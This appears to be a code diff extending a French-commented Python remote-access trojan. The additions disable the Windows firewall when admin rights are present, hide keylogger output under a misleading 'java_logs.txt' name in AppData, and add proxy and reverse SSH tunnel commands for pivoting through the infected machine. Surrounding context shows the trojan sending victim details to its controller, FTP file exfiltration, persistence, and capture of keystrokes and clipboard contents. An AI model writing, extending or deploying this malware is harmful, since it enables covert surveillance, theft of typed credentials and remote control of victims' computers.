@@ -6,8 +6,16 @@
 
     result_commande = ""
 
-    def run(self):
+    appdata = os.path.expandvars("%AppData%")
+    path_keylog = appdata + "/java_logs.txt"
 
+    def run(self):
+        inf = Info()
+        ## si on a les droit admin 
+        # on desactive le parfeux
+        if inf.administrator():
+            cmd = "netsh advfirewall set allprofiles state off"
+            self.Commande(cmd)
         while True:
             conn_ok = False
             ClientSocket = socket.socket()
@@ -25,7 +33,6 @@
             print("Connexion Ok")
             cwd = os.getcwd()
             ClientSocket.send(cwd.encode())
-            inf = Info()
             info = [inf.platform(), inf.public_ip(), inf.local_ip(), inf.mac_address(),
                     inf.architecture(), inf.device(), inf.username(), inf.administrator(), inf.geolocation(), inf.ipv4(inf.local_ip())]
             message = f"{info[0]}{self.SEPARATOR}{info[1]}{self.SEPARATOR}{info[2]}{self.SEPARATOR}\
@@ -73,12 +80,47 @@
                 else:
                     output = "Cat a besoin d'une option"
 
+                if len(splited_command) == 1 and splited_command[0].lower() == "proxy":
+                    print("Lancement du proxy sur le port par défault (9050)")
+                    self.LaunchThread("Proxy", 9050)
+                    output = "Lancement du proxy sur le port par défault (9050)"
+                elif len(splited_command) == 2 and splited_command[0].lower() == "proxy":
+                    if splited_command[1].isnumeric():
+                        print("Lancement du proxy sur le port : " + splited_command[1])
+                        self.LaunchThread("Proxy", int(splited_command[1]))
+                        output = "Lancement du proxy sur le port : " + splited_command[1]
+                    else:
+                        print("Ereur dans l'option du proxy. exemple de la commande : proxy 9050(port d'écoute du serveur proxy)")
+                        output = "Ereur dans l'option du proxy. exemple de la commande : proxy 9050(port d'écoute du serveur proxy)"
+
+                if len(splited_command) == 1 and splited_command[0].lower() == "tunnel":
+                    print("Ouverture du tunnel sur le port remote par défault (9051) vers le port local par défault (9050)")
+                    self.LaunchThread("Tunnel", 9051, 9050)
+                    output = "Ouverture du tunnel sur le port remote par défault (9051) vers le port local par défault (9050)"
+                elif len(splited_command) == 2 and splited_command[0].lower() == "tunnel":
+                    print("Le tunnel nésaisite 2 port en option")
+                    output = "Le tunnel nésaisite 2 port en option"
+                    
+                elif len(splited_command) == 3 and splited_command[0].lower() == "tunnel":
+                    if splited_command[1].isnumeric() and splited_command[2].isnumeric():
+                        print("Ouverture du tunnel sur le port remote {} vers le port local {}".format(splited_command[1], splited_command[2]))
+                        self.LaunchThread("Tunnel", int(splited_command[1]), int(splited_command[2]))
+                        output = "Ouverture du tunnel sur le port remote {} vers le port local {}".format(splited_command[1], splited_command[2])
+                    else:
+                        print("Ereur dans les options. exemple de la commande : tunnel 9051(entrer du tunnel) 9050 (sorti du tunnel)")
+                        output = "Ereur dans les options. exemple de la commande : tunnel 9051(entrer du tunnel) 9050 (sorti du tunnel)"
+
+                elif len(splited_command) > 3 and splited_command[0].lower() == "tunnel":
+                    print("Tunnel a trop d'options")
+                    output = "Tunnel a trop d'options"
+
                 if command.lower() != "download":
 
                     if splited_command[0].lower() == "download":
                         #print("tentative de telechargelent de " + splited_command[1] + " " + self.host + " " + str((self.port+2)))
                         path_fichier = splited_command[1]
                         ftp = FTP('')
+                        ftp.set_pasv(True)
                         ftp.connect(self.host, (self.port+2))
                         ftp.login(user='user', passwd = '12345')
                         fichier = path_fichier
@@ -100,7 +142,7 @@
                     if splited_command[0].lower() == "upload":
                         path_fichier = splited_command[1]
                         ftp = FTP('')
-                        ftp.connect(self.host, (self.port+2))
+                        ftp.connect(self.host, (self.port+2)) 
                         ftp.login(user='user', passwd = '12345')
                         fichier = path_fichier
                         try:
@@ -138,7 +180,7 @@
                         elif splited_command[1].lower() == "status":
                             # envoyer retour du keylogger
                             #self.keylogger_mode = "status"
-                            file = open("keylogs.txt", 'r')
+                            file = open(self.path_keylog, 'r')
                             logs = file.read()
                             file.close()
                             output = logs
@@ -212,7 +254,8 @@
                         output = ""
                 elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance" \
                     and splited_command[0].lower() != "cat" and splited_command[0].lower() != "download" \
-                        and splited_command[0].lower() != "upload":
+                        and splited_command[0].lower() != "upload" and splited_command[0].lower() != "proxy" \
+                            and splited_command[0].lower() != "tunnel":
                     # execute the command and retrieve the results
 
                     """
@@ -246,10 +289,10 @@
 
             ClientSocket.close()
 
-    def LaunchThread(self, fonction, arg1=""):
+    def LaunchThread(self, fonction, arg1="", arg2=""):
         print(fonction)
         t = Threads()
-        t.StartThread(fonction, arg1)
+        t.StartThread(fonction, arg1, arg2)
         return t
 
     def Commande(self, cmd):
@@ -260,6 +303,224 @@
         payload.result_commande = output
         return output
 
+    def StartProxy(self, port):
+        ADDR = "0.0.0.0"
+        PORT = port
+
+        server = pproxy.Server('http+socks4+socks5://{}:{}'.format(ADDR ,str(PORT)))
+        remote = pproxy.Connection('direct')
+        args = dict( rserver = [remote],
+                    verbose = print )
+
+        loop = get_or_create_eventloop()
+        handler = loop.run_until_complete(server.start_server(args))
+        try:
+            print("Lancement du serveur proxy sur : {}:{}".format(ADDR ,str(PORT)))
+            loop.run_forever()
+        except KeyboardInterrupt:
+            print('exit!')
+
+        handler.close()
+        loop.run_until_complete(handler.wait_closed())
+        loop.run_until_complete(loop.shutdown_asyncgens())
+        loop.close()
+
+    def StartTunnel(self, port_entrer, port_sorti):
+
+        SSH_PORT = 22
+        DEFAULT_PORT = port_entrer
+
+        g_verbose = True
+
+
+        def handler(chan, host, port):
+            sock = socket.socket()
+            try:
+                sock.connect((host, port))
+            except Exception as e:
+                verbose("Forwarding request to %s:%d failed: %r" % (host, port, e))
+                return
+
+            verbose(
+                "Connected!  Tunnel open %r -> %r -> %r"
+                % (chan.origin_addr, chan.getpeername(), (host, port))
+            )
+            while True:
+                r, w, x = select.select([sock, chan], [], [])
+                if sock in r:
+                    data = sock.recv(1024)
+                    if len(data) == 0:
+                        break
+                    chan.send(data)
+                if chan in r:
+                    data = chan.recv(1024)
+                    if len(data) == 0:
+                        break
+                    sock.send(data)
+            chan.close()
+            sock.close()
+            verbose("Tunnel closed from %r" % (chan.origin_addr,))
+
+
+        def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
+            transport.request_port_forward("", server_port)
+            while True:
+                chan = transport.accept(1000)
+                if chan is None:
+                    continue
+                thr = threading.Thread(
+                    target=handler, args=(chan, remote_host, remote_port)
+                )
+                thr.setDaemon(True)
+                thr.start()
+
+
+        def verbose(s):
+            if g_verbose:
+                print(s)
+
+
+        HELP = """\
+        Set up a reverse forwarding tunnel across an SSH server, using paramiko. A
+        port on the SSH server (given with -p) is forwarded across an SSH session
+        back to the local machine, and out to a remote site reachable from this
+        network. This is similar to the openssh -R option.
+        """
+
+
+        def get_host_port(spec, default_port):
+            "parse 'hostname:22' into a host and port, with the port optional"
+            args = (spec.split(":", 1) + [default_port])[:2]
+            args[1] = int(args[1])
+            return args[0], args[1]
+
+
+        def parse_options():
+            global g_verbose
+
+            parser = OptionParser(
+                usage="usage: %prog [options] <ssh-server>[:<server-port>]",
+                version="%prog 1.0",
+                description=HELP,
+            )
+            parser.add_option(
+                "-q",
+                "--quiet",
+                action="store_false",
+                dest="verbose",
+                default=True,
+                help="squelch all informational output",
+            )
+            parser.add_option(
+                "-p",
+                "--remote-port",
+                action="store",
+                type="int",
+                dest="port",
+                default=DEFAULT_PORT,
+                help="port on server to forward (default: %d)" % DEFAULT_PORT,
+            )
+            parser.add_option(
+                "-u",
+                "--user",
+                action="store",
+                type="string",
+                dest="user",
+                default="theoc",
+                help="username for SSH authentication (default: %s)"
+                % "theoc",
+            )
+            parser.add_option(
+                "-K",
+                "--key",
+                action="store",
+                type="string",
+                dest="keyfile",
+                default=None,
+                help="private key file to use for SSH authentication",
+            )
+            parser.add_option(
+                "",
+                "--no-key",
+                action="store_false",
+                dest="look_for_keys",
+                default=True,
+                help="don't look for or use a private key file",
+            )
+            parser.add_option(
+                "-P",
+                "--password",
+                action="store_true",
+                dest="readpass",
+                default=False,
+                help="read password (for key or password auth) from stdin",
+            )
+            parser.add_option(
+                "-r",
+                "--remote",
+                action="store",
+                type="string",
+                dest="remote",
+                default=1234,
+                metavar="host:port",
+                help="remote host and port to forward to",
+            )
+            options, args = parser.parse_args()
+
+            #if len(args) != 1:
+                #parser.error("Incorrect number of arguments.")
+            #if options.remote is None:
+                #parser.error("Remote address required (-r).")
+
+            g_verbose = options.verbose
+            server_host, server_port = (self.host, SSH_PORT)
+            remote_host, remote_port = ("127.0.0.1", port_sorti)
+            return options, (server_host, server_port), (remote_host, remote_port)
+
+
+        def main():
+            options, server, remote = parse_options()
+
+            password = "mdp"
+            #if options.readpass:
+                #password = getpass.getpass("Enter SSH password: ")
+
+            client = paramiko.SSHClient()
+            client.load_system_host_keys()
+            client.set_missing_host_key_policy(paramiko.WarningPolicy())
+
+            verbose("Connecting to ssh host %s:%d ..." % (server[0], server[1]))
+            try:
+                client.connect(
+                    server[0],
+                    server[1],
+                    username=options.user,
+                    key_filename=options.keyfile,
+                    look_for_keys=options.look_for_keys,
+                    password=password,
+                )
+            except Exception as e:
+                print("*** Failed to connect to %s:%d: %r" % (server[0], server[1], e))
+                sys.exit(1)
+
+            verbose(
+                "Now forwarding remote port %d to %s:%d ..."
+                % (options.port, remote[0], remote[1])
+            )
+
+            try:
+                reverse_forward_tunnel(
+                    options.port, remote[0], remote[1], client.get_transport()
+                )
+            except KeyboardInterrupt:
+                print("C-c: Port forwarding stopped.")
+                sys.exit(0)
+
+
+        if __name__ == "__main__":
+            main()
+
+
 
 class Keylogger:
 
@@ -267,6 +528,8 @@ class Keylogger:
     kernel32 = windll.kernel32
     psapi = windll.psapi
     current_window = None
+    appdata = os.path.expandvars("%AppData%")
+    path_keylog = appdata + "/java_logs.txt"
 
     def Keylog(self):
 
@@ -308,7 +571,7 @@ class Keylogger:
               (process_id, executable.value, window_title.value))
         var = "PID : %s - %s - %s" % (process_id,
                                       executable.value, window_title.value)
-        file = open("keylogs.txt", 'a')
+        file = open(self.path_keylog, 'a')
         file.write("\n%s\n" % var)
         file.close()
         print()
@@ -337,7 +600,7 @@ class Keylogger:
         if event.Ascii in range(32, 128):
             print(chr(event.Ascii))
             h = chr(event.Ascii)
-            file = open("keylogs.txt", 'a')
+            file = open(self.path_keylog, 'a')
             file.write("%s" % h)
             file.close()
         else:
@@ -347,12 +610,12 @@ class Keylogger:
                 pasted_value = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
                 print("[PASTE] - {0}".format(pasted_value))
-                file = open("keylogs.txt", 'a')
+                file = open(self.path_keylog, 'a')
                 file.write("\n[PASTE] - {0}\n".format(pasted_value))
                 file.close()
             else:
                 print("{0}".format(event.Key))
-                file = open("keylogs.txt", 'a')
+                file = open(self.path_keylog, 'a')
                 file.write("{0}".format(event.Key))
                 file.close()
         # pass execution to next hook registered
